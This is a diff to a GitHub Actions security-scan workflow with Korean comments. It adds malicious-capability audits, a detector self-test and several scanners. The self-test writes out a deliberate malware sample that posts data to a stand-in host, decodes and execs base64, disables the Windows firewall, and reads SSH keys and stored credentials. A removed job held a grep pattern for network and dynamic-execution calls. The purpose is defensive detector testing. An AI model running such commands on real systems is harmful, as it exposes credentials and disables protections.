@@ -1,7 +1,14 @@
 name: Security Scan
 
-# 소스에 악성/위험 코드가 없는지 자동으로 점검한다.
-# 결과는 Actions 탭과 Security 탭에서 확인할 수 있다.
+# "이 코드에 해킹/악성 코드가 없다"를 뒷받침하기 위한 자동 검사.
+#
+# 두 종류를 함께 돌린다.
+#   1) 악성 '행위'를 찾는 검사  — capability-audit, self-test, no-secrets
+#      악성코드가 목적을 달성하려면 반드시 필요한 능력이 있는지 본다.
+#   2) 일반 '취약점'을 찾는 검사 — CodeQL, Semgrep, Bandit, pip-audit
+#      실수로 생긴 보안 약점을 본다.
+#
+# 결과는 Actions 탭의 Summary 에 사람이 읽을 수 있는 보고서로 남는다.
 
 on:
   push:
@@ -9,7 +16,7 @@ on:
   pull_request:
     branches: [main]
   schedule:
-    - cron: '0 0 * * 1'      # 매주 월요일(새 취약점 공개 대응)
+    - cron: '0 0 * * 1'      # 매주 월요일 (새 취약점 공개 대응)
   workflow_dispatch:
 
 permissions:
@@ -17,6 +24,91 @@ permissions:
   security-events: write
 
 jobs:
+  # ===========================================================================
+  # 1) 악성 행위 능력 검사 — 이 저장소의 핵심 증빙
+  # ===========================================================================
+  capability-audit:
+    name: 악성 행위 능력 검사
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - name: 검사 실행
+        run: python tools/capability_audit.py .
+
+  # 탐지기가 실제로 악성 코드를 잡는지 스스로 증명한다.
+  # (아무것도 못 잡는 검사는 통과해도 의미가 없다)
+  audit-self-test:
+    name: 탐지기 자체 검증
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      - name: 일부러 악성 패턴을 심은 샘플을 탐지하는지 확인
+        shell: bash
+        run: |
+          mkdir -p /tmp/audit_selftest
+          cat > /tmp/audit_selftest/malicious_sample.py <<'PY'
+          # 탐지기 검증 전용 샘플 (빌드에 포함되지 않음)
+          import socket, subprocess, base64, winreg
+          from pynput import keyboard
+          def a(d):
+              s = socket.socket()
+              requests.post("http://example.invalid/x", data=d)
+          def b(blob):
+              exec(base64.b64decode(blob))
+              subprocess.Popen(["cmd.exe", "/c", "whoami"])
+              os.system("netsh advfirewall set allprofiles state off")
+          def c():
+              winreg.SetValueEx(None, "x", 0, 1, "p")
+              CredEnumerateW(None, 0)
+              open(".ssh/id_rsa").read()
+          def d():
+              for r, dd, f in os.walk("C:\\Users"):
+                  pass
+          PY
+          if python tools/capability_audit.py /tmp/audit_selftest > /tmp/out.txt 2>&1; then
+            echo "::error::탐지기가 악성 샘플을 잡아내지 못했습니다. 검사가 무력화된 상태입니다."
+            cat /tmp/out.txt
+            exit 1
+          fi
+          MISSED=$(grep -c '✅ 없음' /tmp/out.txt || true)
+          echo "악성 샘플에서 탐지 못한 항목 수: $MISSED"
+          if [ "$MISSED" -ne 0 ]; then
+            echo "::error::탐지기가 일부 항목을 놓쳤습니다."
+            cat /tmp/out.txt
+            exit 1
+          fi
+          echo "✅ 탐지기가 모든 악성 항목을 정상적으로 탐지했습니다."
+          {
+            echo "## 🧪 탐지기 자체 검증"
+            echo ""
+            echo "일부러 악성 패턴(네트워크 유출·셸 실행·난독화·키로거·자격증명 탈취·지속성·보안 무력화)을"
+            echo "심은 샘플을 검사기에 넣어, **모든 항목을 실제로 탐지하는지** 확인했습니다."
+            echo ""
+            echo "결과: ✅ 전 항목 탐지 성공 (탐지기가 정상 작동함)"
+          } >> "$GITHUB_STEP_SUMMARY"
+
+  # 하드코딩된 비밀번호·토큰·키가 없는지 검사
+  no-secrets:
+    name: 비밀정보 유출 검사
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0      # 과거 커밋까지 전부 검사
+      - name: Gitleaks
+        uses: gitleaks/gitleaks-action@v2
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+
+  # ===========================================================================
+  # 2) 일반 취약점 검사
+  # ===========================================================================
   codeql:
     name: CodeQL 분석
     runs-on: ubuntu-latest
@@ -28,6 +120,24 @@ jobs:
           queries: security-extended
       - uses: github/codeql-action/analyze@v3
 
+  semgrep:
+    name: Semgrep 정적 분석
+    runs-on: ubuntu-latest
+    container:
+      image: semgrep/semgrep
+    steps:
+      - uses: actions/checkout@v4
+      - name: 보안 규칙셋으로 검사
+        run: |
+          semgrep scan \
+            --config=p/security-audit \
+            --config=p/secrets \
+            --config=p/python \
+            --error \
+            --skip-unknown-extensions \
+            --exclude=docs --exclude=tools \
+            .
+
   bandit:
     name: Bandit (Python 보안 린터)
     runs-on: ubuntu-latest
@@ -38,7 +148,7 @@ jobs:
           python-version: '3.12'
       - run: pip install bandit
       - name: 검사 실행
-        run: bandit -r . -f txt -ll
+        run: bandit -r . -f txt -ll --exclude ./tools
 
   deps:
     name: 의존성 취약점(pip-audit)
@@ -53,23 +163,6 @@ jobs:
       - name: 사용 라이브러리 점검
         run: pip-audit -r requirements.txt
 
-  no-network:
-    name: 외부 통신 코드 검사
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - name: 네트워크/원격실행 관련 코드가 있는지 확인
-        shell: bash
-        run: |
-          echo "이 프로그램은 네트워크 통신을 하지 않아야 합니다."
-          PATTERN='import[[:space:]]+(socket|requests|urllib|http\.client|ftplib|smtplib|telnetlib|paramiko)|from[[:space:]]+(socket|requests|urllib|http|ftplib|smtplib)[[:space:]]+import|urlopen\(|requests\.(get|post|put|delete)\(|socket\.socket\(|eval\(|exec\(|__import__\(|pickle\.loads\(|base64\.b64decode\('
-          if grep -nEI "$PATTERN" --include='*.py' -r .; then
-            echo ""
-            echo "::error::네트워크 통신 또는 동적 코드 실행으로 보이는 패턴이 발견되었습니다. 위 목록을 확인하세요."
-            exit 1
-          fi
-          echo "통과: 네트워크 통신 / 동적 코드 실행 패턴 없음"
-
   syntax:
     name: 문법 검사
     runs-on: ubuntu-latest
@@ -79,4 +172,27 @@ jobs:
         with:
           python-version: '3.12'
       - name: 컴파일 확인
-        run: python -m compileall -q consulting_ready.py
+        run: python -m compileall -q consulting_ready.py tools/capability_audit.py
+
+  # 모든 검사가 통과했을 때만 요약을 남긴다.
+  summary:
+    name: 검사 종합
+    runs-on: ubuntu-latest
+    needs: [capability-audit, audit-self-test, no-secrets, codeql, semgrep, bandit, deps, syntax]
+    steps:
+      - name: 종합 결과
+        run: |
+          {
+            echo "# ✅ 전체 보안 검사 통과"
+            echo ""
+            echo "| 검사 | 목적 |"
+            echo "|---|---|"
+            echo "| 악성 행위 능력 검사 | 네트워크·셸실행·난독화·키로거·자격증명·지속성 등 9개 능력 부재 확인 |"
+            echo "| 탐지기 자체 검증 | 검사기가 실제로 악성 코드를 잡는지 증명 |"
+            echo "| 비밀정보 유출 검사 | 하드코딩된 토큰·키 부재 확인 (전체 커밋 이력) |"
+            echo "| CodeQL | GitHub 코드 분석 엔진 (security-extended) |"
+            echo "| Semgrep | 보안 규칙셋 정적 분석 |"
+            echo "| Bandit | Python 보안 린터 |"
+            echo "| pip-audit | 의존성 알려진 취약점(CVE) |"
+            echo "| 문법 검사 | 컴파일 가능 여부 |"
+          } >> "$GITHUB_STEP_SUMMARY"
